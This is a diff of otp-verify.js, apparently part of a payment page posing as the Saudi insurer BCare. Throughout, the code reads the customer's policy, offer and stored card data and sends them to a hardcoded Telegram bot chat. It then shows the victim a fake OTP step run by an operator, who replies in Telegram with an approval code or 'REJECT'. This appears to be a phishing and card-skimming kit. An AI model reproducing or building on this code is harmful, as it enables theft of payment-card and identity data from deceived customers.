@@ -1,7 +1,14 @@
 /* =====================================================
-   بي كير — otp-verify.js  v2
-   OTP 6 أرقام + Telegram Bot + إعادة الإرسال
-   ⚠️ هذا النظام للاختبار الشخصي فقط
+   بي كير — otp-verify.js  v3
+   ══════════════════════════════════════════════════
+   التدفق الصحيح:
+   1. العميل يضغط "ادفع الآن" → تفاصيل الطلب تصل Telegram (بدون OTP)
+   2. الأدمن يراجع في Telegram
+   3. الأدمن يرسل رمز 6 أرقام (يختاره بنفسه) للموافقة
+      أو يرسل REJECT للرفض
+   4. الصفحة تستلم قرار الأدمن من Telegram
+   5. إذا وافقت → الرمز يُعرض للعميل → يُدخله → نجاح
+   6. إذا رفضت → الصفحة تُظهر "تم رفض العملية"
 ===================================================== */
 'use strict';
 
@@ -11,15 +18,15 @@ const TG = {
   CHAT:  '1451039924',
 };
 
-const TIMER_SEC = 60;
+const TIMER_SEC = 120; /* دقيقتان للأدمن لمراجعة الطلب */
 
 /* ─── الحالة ─────────────────────────────────────── */
-let otpCode      = '';
+let adminOTP     = '';       /* الرمز الذي يرسله الأدمن */
+let adminDecision= null;     /* 'approve' | 'reject' | null */
 let timerVal     = TIMER_SEC;
 let timerInt     = null;
 let pollInt      = null;
 let lastUpdateId = 0;
-let sendCount    = 0;   /* عدد مرات الإرسال */
 
 /* ─── Telegram API ───────────────────────────────── */
 async function tgSend(text) {
@@ -29,20 +36,12 @@ async function tgSend(text) {
       {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id:    TG.CHAT,
-          text,
-          parse_mode: 'HTML',
-        }),
+        body: JSON.stringify({ chat_id: TG.CHAT, text, parse_mode: 'HTML' }),
       }
     );
     const data = await res.json();
-    if (!data.ok) console.error('TG Error:', data.description);
     return data.ok;
-  } catch(e) {
-    console.error('TG fetch error:', e);
-    return false;
-  }
+  } catch(e) { console.error('TG send:', e); return false; }
 }
 
 async function tgGetUpdates() {
@@ -55,35 +54,15 @@ async function tgGetUpdates() {
   } catch(e) { return []; }
 }
 
-/* ─── الحصول على Chat ID تلقائياً ─────────────────── */
-async function fetchChatId() {
-  if (TG.CHAT !== 'CHAT_ID_HERE') return; /* لدينا بالفعل */
-  const updates = await tgGetUpdates();
-  if (updates.length) {
-    const msg = updates[updates.length - 1];
-    lastUpdateId = msg.update_id;
-    const chatId = msg.message?.chat?.id || msg.callback_query?.from?.id;
-    if (chatId) {
-      TG.CHAT = String(chatId);
-      console.log('✅ Chat ID:', TG.CHAT);
-    }
-  }
-}
-
-/* ─── بناء رسالة Telegram (كل البيانات) ────────────── */
-function buildMsg(otp, isResend) {
+/* ─── بناء رسالة الطلب (بدون OTP) ─────────────────── */
+function buildOrderMsg() {
   try {
     const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
     const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
     const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
-    const inq    = JSON.parse(sessionStorage.getItem('bcare_inquiry')|| '{}');
     const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');
 
-    const header = isResend
-      ? `🔄 <b>إعادة إرسال OTP — المحاولة #${sendCount}</b>`
-      : `🔔 <b>طلب دفع جديد — بي كير</b>`;
-
-    return `${header}
+    return `🔔 <b>طلب دفع جديد — بي كير</b>
 
 👤 <b>العميل</b>
 • الاسم: <b>${policy.fullName || '—'}</b>
@@ -108,47 +87,94 @@ function buildMsg(otp, isResend) {
 • الضريبة 15%: ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
 • <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>
 
-🔑 <b>رمز OTP: <code>${otp}</code></b>
-⏰ صالح لمدة ${TIMER_SEC} ثانية
 🆔 المرجع: <code>${offer.refNumber || '—'}</code>
 
-<i>ردّ على هذه الرسالة بـ: <code>${otp}</code> للموافقة
-أو أرسل: <code>REJECT</code> للرفض</i>`;
+━━━━━━━━━━━━━━━
+✅ <b>للموافقة:</b> أرسل رمز 6 أرقام (تختاره بنفسك)
+❌ <b>للرفض:</b> أرسل <code>REJECT</code>
+
+<i>العميل ينتظر قرارك...</i>`;
   } catch(e) {
-    return `🔔 طلب دفع\nOTP: <code>${otp}</code>`;
+    return `🔔 طلب دفع جديد — بي كير`;
   }
 }
 
-/* ─── Polling رسائل الـ Admin ──────────────────────── */
+/* ─── Polling قرار الأدمن من Telegram ──────────────── */
 function startPolling() {
   clearInterval(pollInt);
   pollInt = setInterval(async () => {
-    if (TG.CHAT === 'CHAT_ID_HERE') {
-      await fetchChatId();
-      return;
-    }
     const updates = await tgGetUpdates();
     for (const u of updates) {
       lastUpdateId = u.update_id;
       const text = u.message?.text?.trim() || '';
 
-      if (text === otpCode) {
-        /* ✅ Admin أرسل الرمز الصحيح → قبول */
+      /* REJECT → رفض */
+      if (text.toUpperCase() === 'REJECT') {
+        adminDecision = 'reject';
         clearInterval(pollInt);
-        autoFillOTP(otpCode);
+        showRejection();
         return;
       }
-      if (text.toUpperCase() === 'REJECT') {
-        /* ❌ Admin رفض → أخطأ OTP */
+
+      /* 6 أرقام → موافقة، الرمز يصبح OTP الصحيح */
+      if (/^\d{6}$/.test(text)) {
+        adminOTP      = text;
+        adminDecision = 'approve';
         clearInterval(pollInt);
-        setOTPErr('تم رفض العملية من قِبل الفريق — تواصل مع الدعم');
+        showOTPToCustomer(text);
         return;
       }
     }
   }, 3000);
 }
 
-/* ─── قراءة البيانات ──────────────────────────────── */
+/* ─── عرض OTP للعميل (بعد موافقة الأدمن) ──────────── */
+function showOTPToCustomer(code) {
+  /* إخفاء رسالة الانتظار */
+  const waitMsg = document.getElementById('otp-waiting-msg');
+  if (waitMsg) waitMsg.style.display = 'none';
+
+  /* تحديث النص */
+  const sub = document.getElementById('otp-sub-text');
+  if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام<br/>
+    <span style="color:var(--blue);font-weight:600">تم إرسال الرمز إلى هاتفك</span>
+    <br/><span style="color:var(--gold);font-weight:700;font-size:.82rem">
+      (للاختبار: <code style="background:rgba(250,166,46,.15);padding:.1rem .5rem;border-radius:6px;letter-spacing:.2em">${code}</code>)
+    </span>`;
+
+  /* إعادة تفعيل المؤقت للعميل (60 ثانية للإدخال) */
+  startCustomerTimer();
+
+  /* تفعيل المربعات */
+  document.querySelectorAll('.otp-box').forEach(b => b.disabled = false);
+  const confirmBtn = document.getElementById('otp-confirm-btn');
+  if (confirmBtn) confirmBtn.style.display = '';
+  document.querySelector('.otp-box')?.focus();
+}
+
+/* ─── عرض الرفض ───────────────────────────────────── */
+function showRejection() {
+  clearInterval(timerInt);
+  clearInterval(pollInt);
+
+  const card = document.getElementById('otp-card');
+  if (card) card.innerHTML = `
+    <div class="off-card-body" style="text-align:center;padding:2.5rem 1.5rem">
+      <div style="width:72px;height:72px;border-radius:50%;background:var(--red-bg);display:flex;align-items:center;justify-content:center;margin:0 auto 1.25rem">
+        <span class="material-icons" style="font-size:2.2rem;color:var(--red)">cancel</span>
+      </div>
+      <h2 style="font-size:1.2rem;font-weight:800;color:var(--red);margin-bottom:.5rem">تم رفض العملية</h2>
+      <p style="font-size:.88rem;color:var(--gray-500);line-height:1.65;margin-bottom:1.5rem">
+        نعتذر، تم رفض عملية الدفع بعد مراجعة البيانات.<br/>
+        يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.
+      </p>
+      <button type="button" class="off-btn-secondary" style="width:100%" onclick="window.location.href='secure-checkout.html'">
+        العودة لصفحة الدفع
+      </button>
+    </div>`;
+}
+
+/* ─── قراءة بيانات العملية ────────────────────────── */
 function loadData() {
   try {
     const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
@@ -158,10 +184,32 @@ function loadData() {
   } catch(e) {}
 }
 
-/* ─── Timer ───────────────────────────────────────── */
-function startTimer(onExpire) {
+/* ─── Timer انتظار الأدمن ─────────────────────────── */
+function startAdminTimer() {
   timerVal = TIMER_SEC;
-  const countEl   = document.getElementById('otp-timer-count');
+  const countEl = document.getElementById('otp-timer-count');
+  const resendBtn = document.getElementById('otp-resend-btn');
+
+  clearInterval(timerInt);
+  timerInt = setInterval(() => {
+    timerVal--;
+    if (countEl) {
+      countEl.textContent = timerVal;
+      countEl.classList.toggle('urgent', timerVal <= 30);
+    }
+    if (timerVal <= 0) {
+      clearInterval(timerInt);
+      if (countEl) countEl.textContent = '00';
+      /* انتهى الوقت بدون قرار → إعادة الإرسال */
+      if (resendBtn) resendBtn.disabled = false;
+    }
+  }, 1000);
+}
+
+/* ─── Timer إدخال العميل (بعد الموافقة) ───────────── */
+function startCustomerTimer() {
+  timerVal = 60;
+  const countEl = document.getElementById('otp-timer-count');
   const resendBtn = document.getElementById('otp-resend-btn');
   if (resendBtn) resendBtn.disabled = true;
 
@@ -174,48 +222,20 @@ function startTimer(onExpire) {
     }
     if (timerVal <= 0) {
       clearInterval(timerInt);
-      if (resendBtn) resendBtn.disabled = false;
       if (countEl) countEl.textContent = '00';
-      if (onExpire) onExpire();
+      if (resendBtn) resendBtn.disabled = false;
     }
   }, 1000);
-}
-
-/* ─── إرسال OTP + بدء كل شيء ────────────────────── */
-async function sendOTP(isResend = false) {
-  otpCode = String(Math.floor(100000 + Math.random() * 900000));
-  sendCount++;
-
-  /* إرسال لـ Telegram */
-  const msg = buildMsg(otpCode, isResend);
-  const sent = await tgSend(msg);
-
-  /* وضع التطوير */
-  if (TG.CHAT === 'CHAT_ID_HERE' || !sent) {
-    console.log(`🔑 OTP: ${otpCode}`);
-    showDevOTP(otpCode);
-  }
-
-  /* بدء المؤقت */
-  startTimer(() => {
-    /* عند انتهاء الوقت — يُمكّن إعادة الإرسال */
-  });
-  startPolling();
-}
-
-function showDevOTP(otp) {
-  const el = document.getElementById('otp-sub-text');
-  if (el) el.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام<br/>
-    <span style="color:var(--gold);font-weight:700;font-size:.82rem">
-      ⚙️ وضع تطوير:
-      <code style="background:rgba(250,166,46,.15);padding:.1rem .5rem;border-radius:6px;letter-spacing:.2em;font-size:.95rem">${otp}</code>
-    </span>`;
 }
 
 /* ─── مربعات OTP ──────────────────────────────────── */
 function initBoxes() {
   const boxes      = [...document.querySelectorAll('.otp-box')];
   const confirmBtn = document.getElementById('otp-confirm-btn');
+
+  /* معطّلة حتى يوافق الأدمن */
+  boxes.forEach(b => b.disabled = true);
+  if (confirmBtn) confirmBtn.style.display = 'none';
 
   boxes.forEach((box, idx) => {
     box.addEventListener('input', e => {
@@ -248,45 +268,61 @@ function initBoxes() {
   /* زر التأكيد */
   if (confirmBtn) confirmBtn.addEventListener('click', verifyOTP);
 
-  /* إعادة الإرسال */
+  /* إعادة الإرسال (تعيد رسالة الطلب للأدمن) */
   const resendBtn = document.getElementById('otp-resend-btn');
   if (resendBtn) {
     resendBtn.addEventListener('click', async () => {
-      /* مسح الإدخال */
-      boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); });
-      if (confirmBtn) confirmBtn.disabled = true;
+      boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); b.disabled = true; });
+      if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.style.display = 'none'; }
       clearOTPErr();
-      clearInterval(pollInt);
-      await sendOTP(true);
-      boxes[0]?.focus();
+      adminOTP = '';
+      adminDecision = null;
+      /* إعادة إرسال رسالة الطلب */
+      await tgSend(buildOrderMsg());
+      /* إعادة المؤقت */
+      startAdminTimer();
+      startPolling();
+      /* إظهار رسالة انتظار */
+      const waitMsg = document.getElementById('otp-waiting-msg');
+      if (waitMsg) waitMsg.style.display = '';
+      const sub = document.getElementById('otp-sub-text');
+      if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام<br/>
+        <span style="color:var(--blue);font-weight:600">بانتظار مراجعة العملية...</span>`;
     });
   }
 }
 
-/* ─── التحقق من OTP ───────────────────────────────── */
+/* ─── التحقق من OTP (مقارنة برمز الأدمن) ───────────── */
 async function verifyOTP() {
   const boxes   = [...document.querySelectorAll('.otp-box')];
   const entered = boxes.map(b => b.value).join('');
 
-  if (entered === otpCode) {
+  if (entered === adminOTP) {
+    /* ✅ صحيح */
     clearInterval(timerInt);
     clearInterval(pollInt);
     boxes.forEach(b => b.classList.add('otp-success'));
 
-    /* 📨 رسالة ثانية لـ Telegram: العميل أكّد الرمز */
-    await tgSend(buildConfirmMsg(entered, true));
+    /* 📨 رسالة لـ Telegram: العميل أكّد */
+    try {
+      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
+      await tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>
+
+🏢 ${offer.companyName||'—'}
+💰 ر.س ${parseFloat(offer.total||0).toFixed(2)}
+🆔 <code>${offer.refNumber||'—'}</code>
+
+<i>العملية مكتملة ✅</i>`);
+    } catch(e) {}
 
     showSuccess();
   } else {
+    /* ❌ خاطئ */
     boxes.forEach(b => {
       b.classList.add('otp-error');
       setTimeout(() => b.classList.remove('otp-error'), 500);
     });
-    setOTPErr('رمز التحقق غير صحيح — حاول مرة أخرى أو أعد الإرسال');
-
-    /* 📨 رسالة ثانية لـ Telegram: العميل أدخل رمز خاطئ */
-    await tgSend(buildConfirmMsg(entered, false));
-
+    setOTPErr('رمز التحقق غير صحيح — حاول مرة أخرى');
     setTimeout(() => {
       boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
       const confirmBtn = document.getElementById('otp-confirm-btn');
@@ -294,48 +330,6 @@ async function verifyOTP() {
       boxes[0]?.focus();
     }, 600);
   }
-}
-
-/* ─── بناء رسالة تأكيد العميل (الرسالة الثانية) ────── */
-function buildConfirmMsg(entered, correct) {
-  try {
-    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
-    if (correct) {
-      return `✅ <b>العميل أكّد الرمز</b>
-
-🔑 الرمز الذي أدخله العميل: <code>${entered}</code>
-✅ <b>الرمز صحيح — تم تأكيد الدفع</b>
-
-🏢 الشركة: ${offer.companyName || '—'}
-💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
-🆔 المرجع: <code>${offer.refNumber || '—'}</code>
-
-<i>العملية مكتملة ✅</i>`;
-    } else {
-      return `❌ <b>العميل أدخل رمز خاطئ</b>
-
-🔑 الرمز الذي أدخله: <code>${entered}</code>
-❌ <b>الرمز غير صحيح</b>
-
-🏢 الشركة: ${offer.companyName || '—'}
-💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
-🆔 المرجع: <code>${offer.refNumber || '—'}</code>
-
-<i>العميل سيعيد المحاولة...</i>`;
-    }
-  } catch(e) {
-    return correct
-      ? `✅ العميل أكّد الرمز: <code>${entered}</code>`
-      : `❌ العميل أدخل رمز خاطئ: <code>${entered}</code>`;
-  }
-}
-
-function autoFillOTP(code) {
-  const boxes = [...document.querySelectorAll('.otp-box')];
-  code.split('').forEach((d,i) => { if(boxes[i]) { boxes[i].value=d; boxes[i].classList.add('filled'); }});
-  const confirmBtn = document.getElementById('otp-confirm-btn');
-  if (confirmBtn) confirmBtn.disabled = false;
-  setTimeout(verifyOTP, 300);
 }
 
 function setOTPErr(msg) { const e=document.getElementById('otp-err'); if(e) e.textContent=msg; }
@@ -348,13 +342,6 @@ function showSuccess() {
     confirmBtn.disabled = true;
     confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> جاري التأكيد...';
   }
-
-  /* إرسال إشعار نجاح لـ Telegram */
-  try {
-    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
-    tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>\n🏢 ${offer.companyName||'—'}\n💰 ر.س ${parseFloat(offer.total||0).toFixed(2)}\n🆔 ${offer.refNumber||'—'}`);
-  } catch(e) {}
-
   setTimeout(() => {
     document.getElementById('otp-card')?.classList.add('hidden');
     const sc = document.getElementById('otp-success-card');
@@ -384,11 +371,10 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
   } catch(e) {}
 
-  /* محاولة الحصول على Chat ID إذا لم يكن محدداً */
-  await fetchChatId();
+  /* 📨 إرسال رسالة الطلب للأدمن (بدون OTP) */
+  await tgSend(buildOrderMsg());
 
-  /* إرسال OTP */
-  await sendOTP(false);
-
-  document.querySelector('.otp-box')?.focus();
+  /* بدء المؤقت + الاستماع لقرار الأدمن */
+  startAdminTimer();
+  startPolling();
 });
